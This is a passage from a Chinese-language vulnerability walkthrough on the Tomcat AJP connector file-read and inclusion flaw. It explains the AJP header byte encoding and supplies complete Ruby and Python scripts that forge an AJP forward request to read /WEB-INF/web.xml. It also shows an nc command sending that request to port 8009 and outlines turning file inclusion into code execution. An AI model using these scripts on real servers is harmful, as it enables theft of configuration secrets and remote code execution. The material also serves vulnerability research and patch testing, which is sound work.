我们需要关注的是第三章图最后两行,也就是下面这两行
    AJP_REMOTE_PORT: 59058
    AJP_LOCAL_ADDR: 127.0.0.1
在 Wireshark 中复制(选中该行右键copy-> as hex stream) 出 16 进制字符串为:
    0a000f414a505f52454d4f54455f504f5254000005353930353800       # AJP_REMOTE_PORT: 59058
    0a000e414a505f4c4f43414c5f414444520000093132372e302e302e3100 # AJP_LOCAL_ADDR: 127.0.0.1
这些字符串怎么构造的呢?
`0a00` 是`request_header`的标志, 表示后面的数据是 `request_header`. 在官方文档有写 `0f` 是
`request_header` 的长度
![header1 = '0a000f414a505f52454d4f54455f504f5254000005353930353800'
hex\(len\(binascii.unhexlify\(b'414a505f52454d4f54455f504f5254'\)\)\)](https://images.seebug.org/content/images/2020/03/18/1584511014000-6hayuz.png-w331s)`414a505f52454d4f54455f504f5254`
是 `AJP_REMOTE_PORT`
`0000` 用来分割请求头名称和值
`053539303538` 是 `59058` 的 16 进制 `00` 表示结束
关键的字节是怎么构造的已经明白了, 那现在只要把 Wireshark 中抓取到的数据包修改一下, 把
    AJP_REMOTE_PORT: 59058
    AJP_LOCAL_ADDR: 127.0.0.1
按照二进制数据格式替换成
    javax.servlet.include.request_uri: /WEB-INF/web.xml
    javax.servlet.include.path_info: web.xml
    javax.servlet.include.servlet_path: /WEB-INF/
在修改 `AJP DATA LENGTH` 为正确的大小即可
因此编写了代码构造了原始请求的 16 进制数据然后通过 nc 发送成功触发漏洞
ruby 版
    AJP_MAGIC = '1234'
    AJP_REQUEST_HEADER = '02020008485454502f312e310000012f0000093132372e302e302e310000096c6f63616c686f73740000093132372e302e302e31000050000007a00b00093132372e302e302e3100a00e00444d6f7a696c6c612f352e3020285831313b204c696e7578207838365f36343b2072763a36382e3029204765636b6f2f32303130303130312046697265666f782f36382e3000a001003f746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e3800a004000e656e2d55532c656e3b713d302e3500a003000d677a69702c206465666c61746500a006000a6b6565702d616c697665000019557067726164652d496e7365637572652d52657175657374730000013100'
    def pack_attr(s)
        ## return len(s) + unhex(s)
        return s.length.to_s(16).to_s.rjust(2, "0") + s.unpack("H*")[0]
    end
    attribute = Hash[
        'javax.servlet.include.request_uri' => '/WEB-INF/web.xml',
        'javax.servlet.include.path_info' => 'web.xml',
        'javax.servlet.include.servlet_path' => '/WEB-INF/']
    req_attribute = ""
    attribute.each do |key, value|
        req_attribute += '0a00' + pack_attr(key) + '0000' + pack_attr(value) + '00'
    end
    AJP_DATA = AJP_REQUEST_HEADER + req_attribute + 'ff'
    AJP_DATA_LENGTH = (AJP_DATA.length / 2).to_s(16).to_s.rjust(4, "0")
    AJP_FORWARD_REQUEST = AJP_MAGIC + AJP_DATA_LENGTH + AJP_DATA
    puts AJP_FORWARD_REQUEST
python版
    import binascii
    AJP_MAGIC = '1234'.encode()
    AJP_HEADER = b'02020008485454502f312e310000062f312e7478740000093132372e302e302e310000096c6f63616c686f73740000093132372e302e302e31000050000007a00b00093132372e302e302e3100a00e00444d6f7a696c6c612f352e3020285831313b204c696e7578207838365f36343b2072763a36382e3029204765636b6f2f32303130303130312046697265666f782f36382e3000a001003f746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e3800a004000e656e2d55532c656e3b713d302e3500a003000d677a69702c206465666c61746500a006000a6b6565702d616c697665000019557067726164652d496e7365637572652d52657175657374730000013100'
    def unhex(hex):
        return binascii.unhexlify(hex)
    def pack_attr(attr):
        attr_length = hex(len(attr))[2:].encode().zfill(2)
        return attr_length + binascii.hexlify(attr.encode())
    attribute = {
        'javax.servlet.include.request_uri': '/WEB-INF/web.xml',
        'javax.servlet.include.path_info': 'web.xml',
        'javax.servlet.include.servlet_path': '/WEB-INF/',
    }
    req_attribute = b''
    for key,value in attribute.items():
        key_length = hex(len(key))[2:].encode().zfill(2)
        value_length = hex(len(value))[2:].encode().zfill(2)
        req_attribute += b'0a00' + pack_attr(key) + b'0000' + pack_attr(value) + b'00'
    AJP_DATA = AJP_HEADER + req_attribute + b'ff'
    AJP_DATA_LENGTH = hex(len(binascii.unhexlify(AJP_DATA)))[2:].zfill(4)
    AJP_FORWARD_REQUEST = AJP_MAGIC + AJP_DATA_LENGTH.encode() + AJP_DATA
    print(AJP_FORWARD_REQUEST)
测试一下
    ruby ajp-exp.rb | xxd -r -p | nc -v 172.16.19.171 8009
BINGO!
成功读取 `/WEB-INF/web.xml` 文件的源码
那现在怎么执行代码?
在 Tomcat `webapps/ROOT` 目录下新建一个文件 `1.txt`
然后构造那三个属性修改值为:
    javax.servlet.include.request_uri: /1.txt
    javax.servlet.include.path_info: 1.txt
    javax.servlet.include.servlet_path: /
在测试一下
    ruby ajp-exp.rb | xxd -r -p | nc -v 172.16.19.171 8009
BINGO AGAIN
**参考链接**
  1. 
  2. 
  3. 
* * *